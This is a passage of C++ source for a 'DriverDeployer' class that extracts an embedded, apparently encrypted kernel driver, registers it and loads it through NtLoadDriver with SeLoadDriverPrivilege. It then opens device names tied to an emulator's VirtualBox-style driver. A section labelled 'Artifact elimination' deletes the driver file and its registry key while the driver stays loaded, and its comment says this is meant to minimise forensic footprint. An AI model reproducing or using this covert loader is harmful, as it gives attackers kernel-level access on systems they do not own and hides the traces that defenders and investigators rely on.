            DbgLog("    [SecureDeleteFile] File not found (already deleted): %ls", wszPath);
            return true;
        }

        // Transient errors - retry
        if (err == ERROR_ACCESS_DENIED || err == ERROR_SHARING_VIOLATION || err == ERROR_LOCK_VIOLATION) {
            DbgLog("    [SecureDeleteFile] Retry %d - error %lu for %ls", attempt + 1, err, wszPath);
            Sleep(RETRY_DELAY_MS);
            continue;
        }

        // Unexpected error
        DbgLog("    [SecureDeleteFile] Unexpected error %lu for %ls", err, wszPath);
        break;
    }

    // All retries exhausted - schedule deletion on reboot
    if (MoveFileExW(wszPath, nullptr, MOVEFILE_DELAY_UNTIL_REBOOT)) {
        DbgLog("    [SecureDeleteFile] Scheduled for deletion on reboot: %ls", wszPath);
        return true;
    }

    DbgLog("    [SecureDeleteFile] FAILED: Could not delete or schedule: %ls (error %lu)",
           wszPath, ::GetLastError());
    return false;
}

bool DriverDeployer::DeleteDriverRegistry(const wchar_t* wszServiceName)
{
    std::wstring regPath = L"SYSTEM\\CurrentControlSet\\Services\\";
    regPath += wszServiceName;

    constexpr int MAX_RETRIES = 5;
    constexpr DWORD RETRY_DELAY_MS = 50;

    for (int attempt = 0; attempt < MAX_RETRIES; attempt++) {
        LSTATUS status = RegDeleteKeyW(HKEY_LOCAL_MACHINE, regPath.c_str());

        if (status == ERROR_SUCCESS) {
            DbgLog("    [DeleteDriverRegistry] Registry key deleted (attempt %d)", attempt + 1);
            return true;
        }

        if (status == ERROR_FILE_NOT_FOUND) {
            // Key doesn't exist - that's fine, job done
            DbgLog("    [DeleteDriverRegistry] Registry key not found (already deleted)");
            return true;
        }

        // Transient errors - retry
        if (status == ERROR_ACCESS_DENIED || status == ERROR_SHARING_VIOLATION) {
            DbgLog("    [DeleteDriverRegistry] Retry %d - error %lu", attempt + 1, status);
            Sleep(RETRY_DELAY_MS);
            continue;
        }

        // Unexpected error - log and return
        DbgLog("    [DeleteDriverRegistry] FAILED: error %lu on attempt %d", status, attempt + 1);
        return false;
    }

    DbgLog("    [DeleteDriverRegistry] FAILED: max retries exhausted");
    return false;
}

bool DriverDeployer::DeployViaNtLoadDriver(const DriverResource* pResource)
{
    DbgLog("  [DeployViaNtLoadDriver] Starting NtLoadDriver-based deployment...");
    DbgLog("  [DeployViaNtLoadDriver] Service name: %ls", pResource->wszServiceName);
    DbgLog("  [DeployViaNtLoadDriver] Device name: %ls", pResource->wszDeviceName);

    // Get ntdll functions
    DbgLog("  [DeployViaNtLoadDriver] Getting ntdll functions...");
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        DbgLog("  [DeployViaNtLoadDriver] FAILED: GetModuleHandleW(ntdll.dll)");
        SetError("Failed to get ntdll.dll handle");
        return false;
    }

    auto NtLoadDriver = reinterpret_cast<PFN_NtLoadDriver>(
        GetProcAddress(hNtdll, "NtLoadDriver"));
    auto RtlInitUnicodeString = reinterpret_cast<PFN_RtlInitUnicodeString>(
        GetProcAddress(hNtdll, "RtlInitUnicodeString"));

    DbgLog("  [DeployViaNtLoadDriver] NtLoadDriver=%p, RtlInitUnicodeString=%p",
           NtLoadDriver, RtlInitUnicodeString);

    if (!NtLoadDriver || !RtlInitUnicodeString) {
        DbgLog("  [DeployViaNtLoadDriver] FAILED: Could not resolve ntdll functions");
        SetError("Failed to get NtLoadDriver/RtlInitUnicodeString");
        return false;
    }

    // Extract driver to temp
    wchar_t wszTargetPath[MAX_PATH];
    if (!GetTempPathW(MAX_PATH, wszTargetPath)) {
        DbgLog("  [DeployViaNtLoadDriver] FAILED: GetTempPathW");
        SetError("Failed to get temp path");
        return false;
    }
    wcscat_s(wszTargetPath, pResource->wszServiceName);
    wcscat_s(wszTargetPath, L".sys");

    DbgLog("  [DeployViaNtLoadDriver] Target path: %ls", wszTargetPath);
    DbgLog("  [DeployViaNtLoadDriver] Extracting driver from resource...");

    if (!ExtractDriverFromResource(pResource, wszTargetPath)) {
        DbgLog("  [DeployViaNtLoadDriver] FAILED: Extraction failed");
        return false;
    }

    m_wszDriverPath = wszTargetPath;
    m_wszServiceName = pResource->wszServiceName;

    // Verify file exists
    DWORD fileAttrs = GetFileAttributesW(wszTargetPath);
    if (fileAttrs == INVALID_FILE_ATTRIBUTES) {
        DbgLog("  [DeployViaNtLoadDriver] WARNING: File not found after extraction! Error %lu", ::GetLastError());
    } else {
        DbgLog("  [DeployViaNtLoadDriver] File verified on disk (attrs=0x%08X)", fileAttrs);

        // Get file size
        WIN32_FILE_ATTRIBUTE_DATA fad;
        if (GetFileAttributesExW(wszTargetPath, GetFileExInfoStandard, &fad)) {
            DbgLog("  [DeployViaNtLoadDriver] File size: %lu bytes", fad.nFileSizeLow);
        }
    }

    // Create registry entry
    DbgLog("  [DeployViaNtLoadDriver] Creating registry entry...");
    if (!CreateDriverRegistry(wszTargetPath, pResource->wszServiceName)) {
        DbgLog("  [DeployViaNtLoadDriver] FAILED: Registry creation failed");
        SecureDeleteFile(wszTargetPath);
        return false;
    }

    // Build registry path for NtLoadDriver
    std::wstring ntRegPath = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\";
    ntRegPath += pResource->wszServiceName;

    DbgLog("  [DeployViaNtLoadDriver] NT registry path: %ls", ntRegPath.c_str());

    UNICODE_STRING usDriverPath;
    RtlInitUnicodeString(&usDriverPath, ntRegPath.c_str());

    // Enable SeLoadDriverPrivilege (required for NtLoadDriver)
    DbgLog("  [DeployViaNtLoadDriver] Enabling SeLoadDriverPrivilege...");
    if (!EnablePrivilege(SE_LOAD_DRIVER_NAME)) {
        DbgLog("  [DeployViaNtLoadDriver] FAILED: Could not enable SeLoadDriverPrivilege");
        SetError("Failed to enable SeLoadDriverPrivilege - need administrator rights");
        DeleteDriverRegistry(pResource->wszServiceName);
        SecureDeleteFile(wszTargetPath);
        return false;
    }
    DbgLog("  [DeployViaNtLoadDriver] Privilege enabled");

    // Load driver
    DbgLog("  [DeployViaNtLoadDriver] Calling NtLoadDriver...");
    NTSTATUS status = NtLoadDriver(&usDriverPath);
    DbgLog("  [DeployViaNtLoadDriver] NtLoadDriver returned: 0x%08X", status);

    if (status != STATUS_SUCCESS && status != STATUS_IMAGE_ALREADY_LOADED) {
        DbgLog("  [DeployViaNtLoadDriver] FAILED: NtLoadDriver error 0x%08X", status);
        DbgLog("  [DeployViaNtLoadDriver] Common NTSTATUS values:");
        DbgLog("  [DeployViaNtLoadDriver]   0x00000000 = STATUS_SUCCESS");
        DbgLog("  [DeployViaNtLoadDriver]   0xC000010E = STATUS_IMAGE_ALREADY_LOADED");
        DbgLog("  [DeployViaNtLoadDriver]   0xC0000034 = STATUS_OBJECT_NAME_NOT_FOUND");
        DbgLog("  [DeployViaNtLoadDriver]   0xC0000022 = STATUS_ACCESS_DENIED");
        DbgLog("  [DeployViaNtLoadDriver]   0xC0000428 = STATUS_INVALID_IMAGE_HASH (signature)");
        DbgLog("  [DeployViaNtLoadDriver]   0xC000007B = STATUS_INVALID_IMAGE_FORMAT");
        SetError("NtLoadDriver failed (NTSTATUS: 0x%08X). "
                 "Check: Test Signing mode enabled? Driver signature valid? "
                 "Check Event Viewer > System for driver load errors.",
                 status);
        DeleteDriverRegistry(pResource->wszServiceName);
        SecureDeleteFile(wszTargetPath);
        return false;
    }

    if (status == STATUS_IMAGE_ALREADY_LOADED) {
        DbgLog("  [DeployViaNtLoadDriver] Driver already loaded (OK)");
    } else {
        DbgLog("  [DeployViaNtLoadDriver] Driver loaded successfully");
    }

    // Wait for driver initialization - retry loop for race condition mitigation
    DbgLog("  [DeployViaNtLoadDriver] Waiting for device to become accessible...");
    DWORD dwErrors[3] = {0};
    const wchar_t* deviceNames[] = {
        pResource->wszDeviceName,    // Primary: \\.\Ld9BoxDrv
        DEVICE_NAME_LDPLAYER_USER,   // User variant: \\.\Ld9BoxDrvU
        DEVICE_NAME_VBOX             // Legacy VBox: \\.\VBoxDrv
    };

    bool deviceOpened = false;
    for (int retry = 0; retry < 5 && !deviceOpened; retry++) {
        DbgLog("  [DeployViaNtLoadDriver] Retry %d/5...", retry + 1);
        Sleep(100);  // 100ms per attempt, up to 500ms total

        for (int i = 0; i < 3; i++) {
            if (OpenDevice(deviceNames[i])) {
                DbgLog("  [DeployViaNtLoadDriver] SUCCESS: Device opened on retry %d", retry + 1);
                deviceOpened = true;
                break;
            }
            dwErrors[i] = ::GetLastError();
        }
    }

    if (!deviceOpened) {
        DbgLog("  [DeployViaNtLoadDriver] FAILED: All device open attempts failed after 500ms");
        DbgLog("  [DeployViaNtLoadDriver]   %ls -> error %lu", deviceNames[0], dwErrors[0]);
        DbgLog("  [DeployViaNtLoadDriver]   %ls -> error %lu", deviceNames[1], dwErrors[1]);
        DbgLog("  [DeployViaNtLoadDriver]   %ls -> error %lu", deviceNames[2], dwErrors[2]);
        DbgLog("  [DeployViaNtLoadDriver] Common errors: 2=FILE_NOT_FOUND, 5=ACCESS_DENIED");

        SetError("Driver loaded but device not accessible after 500ms. "
                 "Tried %ls (error %lu), %ls (error %lu), %ls (error %lu). "
                 "Possible causes: DriverEntry failed, device name mismatch, "
                 "or driver blocked by Windows security. "
                 "Check Event Viewer > System for details.",
                 deviceNames[0], dwErrors[0],
                 deviceNames[1], dwErrors[1],
                 deviceNames[2], dwErrors[2]);

        // Unload and cleanup
        DbgLog("  [DeployViaNtLoadDriver] Unloading driver and cleaning up...");
        auto NtUnloadDriver = reinterpret_cast<PFN_NtUnloadDriver>(
            GetProcAddress(hNtdll, "NtUnloadDriver"));
        if (NtUnloadDriver) {
            NTSTATUS unloadStatus = NtUnloadDriver(&usDriverPath);
            DbgLog("  [DeployViaNtLoadDriver] NtUnloadDriver returned: 0x%08X", unloadStatus);
        }
        DeleteDriverRegistry(pResource->wszServiceName);
        SecureDeleteFile(wszTargetPath);
        return false;
    }

    //=========================================================================
    // PHASE 3: Immediate Artifact Elimination
    // Delete registry key and driver file while driver remains loaded.
    // This minimizes forensic footprint - driver is in memory and functional,
    // but no disk/registry artifacts remain.
    //=========================================================================
    DbgLog("  [DeployViaNtLoadDriver] Phase 3: Artifact elimination...");

    // 1. Delete registry service key immediately
    DbgLog("  [DeployViaNtLoadDriver] Deleting registry key...");
    DeleteDriverRegistry(pResource->wszServiceName);

    // 2. Force flush registry to minimize transaction log window
    HKEY hSystemKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM", 0, KEY_WRITE, &hSystemKey) == ERROR_SUCCESS) {
        RegFlushKey(hSystemKey);
        RegCloseKey(hSystemKey);
    }

    // 3. Delete driver file from disk (driver is already loaded in memory)
    DbgLog("  [DeployViaNtLoadDriver] Deleting driver file...");
    if (SecureDeleteFile(wszTargetPath)) {
        // File deleted or scheduled - clear path to prevent double-deletion in Cleanup()
        m_wszDriverPath.clear();
    }

    // 4. Clear registry-created flag to prevent double-deletion in Cleanup()
    m_bCreatedRegistry = false;

    m_DeployMethod = DeployMethod::NtLoadDriver;
    m_bDeployed = true;
    DbgLog("  [DeployViaNtLoadDriver] SUCCESS: Deployment complete");
    return true;
}

//-----------------------------------------------------------------------------
// Public API
//-----------------------------------------------------------------------------

bool DriverDeployer::Deploy(DeployMethod method, const DriverResource* pResource)
{
    DbgLog("[Deploy] Starting driver deployment...");
    DbgLog("[Deploy] Method: %s",
           method == DeployMethod::SCM ? "SCM" :
           method == DeployMethod::NtLoadDriver ? "NtLoadDriver" : "Auto");

    if (m_bDeployed) {
        DbgLog("[Deploy] Already deployed, returning true");
        return true;  // Already deployed
    }

    // Use default resource if none provided
    if (!pResource) {
        DbgLog("[Deploy] Using default resource configuration");
        pResource = &DEFAULT_RESOURCE;
    }

    DbgLog("[Deploy] Resource config:");
    DbgLog("[Deploy]   Name: %ls", pResource->wszResourceName);
    DbgLog("[Deploy]   Device: %ls", pResource->wszDeviceName);
    DbgLog("[Deploy]   Service: %ls", pResource->wszServiceName);
    DbgLog("[Deploy]   Key: 0x%08X", pResource->dwEncryptionKey);

    //-------------------------------------------------------------------------
    // Step 1: Try to use an existing installation
    // This checks: running device → existing service → known paths
    //-------------------------------------------------------------------------
    DbgLog("[Deploy] Step 1: Checking for existing driver installation...");
    if (TryUseExistingDriver(pResource)) {
        DbgLog("[Deploy] SUCCESS: Using existing driver installation");
        return true;
    }
    DbgLog("[Deploy] No existing installation found");

    //-------------------------------------------------------------------------
    // Step 2: No existing installation - deploy from embedded resources
    //-------------------------------------------------------------------------
    DbgLog("[Deploy] Step 2: Deploying from embedded resources...");
    switch (method) {
    case DeployMethod::SCM:
        DbgLog("[Deploy] Using SCM method...");
        return DeployViaSCM(pResource);

    case DeployMethod::NtLoadDriver:
        DbgLog("[Deploy] Using NtLoadDriver method...");
        return DeployViaNtLoadDriver(pResource);

    case DeployMethod::Auto:
    default:
        // Try SCM first, fallback to NtLoadDriver
        DbgLog("[Deploy] Auto mode: trying SCM first...");
        if (DeployViaSCM(pResource)) {
            return true;
        }
        DbgLog("[Deploy] SCM failed, trying NtLoadDriver...");
        // Clear error and try NtLoadDriver
        m_LastError.clear();
        return DeployViaNtLoadDriver(pResource);
    }
}

void DriverDeployer::Cleanup(bool bDeleteFiles)
{
    // Close device handle
    if (m_hDevice != INVALID_HANDLE_VALUE) {
        CloseHandle(m_hDevice);
        m_hDevice = INVALID_HANDLE_VALUE;
    }

    if (m_DeployMethod == DeployMethod::SCM && m_hService) {
        // Stop service
        SERVICE_STATUS status;
        ControlService(m_hService, SERVICE_CONTROL_STOP, &status);

        // Wait briefly for service to stop
        Sleep(100);

        // Delete service if we created it
        if (m_bCreatedService) {
            DeleteService(m_hService);
        }

        CloseServiceHandle(m_hService);
        m_hService = NULL;
    }

    if (m_hSCM) {
        CloseServiceHandle(m_hSCM);
        m_hSCM = NULL;
    }

    if (m_DeployMethod == DeployMethod::NtLoadDriver) {
        // Unload driver
        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
        if (hNtdll) {
            auto NtUnloadDriver = reinterpret_cast<PFN_NtUnloadDriver>(
                GetProcAddress(hNtdll, "NtUnloadDriver"));
            auto RtlInitUnicodeString = reinterpret_cast<PFN_RtlInitUnicodeString>(
                GetProcAddress(hNtdll, "RtlInitUnicodeString"));

            if (NtUnloadDriver && RtlInitUnicodeString && !m_wszServiceName.empty()) {
                std::wstring ntRegPath = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\";
                ntRegPath += m_wszServiceName;

                UNICODE_STRING usDriverPath;
                RtlInitUnicodeString(&usDriverPath, ntRegPath.c_str());
                NtUnloadDriver(&usDriverPath);
            }
        }

        // Delete registry entries
        if (m_bCreatedRegistry && !m_wszServiceName.empty()) {
            DeleteDriverRegistry(m_wszServiceName.c_str());
        }
    }

    // Delete driver file with retry and reboot fallback
    if (bDeleteFiles && !m_wszDriverPath.empty()) {
        SecureDeleteFile(m_wszDriverPath.c_str());
    }

    m_bDeployed = false;
    m_bCreatedService = false;
    m_bCreatedRegistry = false;
    m_wszDriverPath.clear();
    m_wszServiceName.clear();
}

} // namespace supdrv
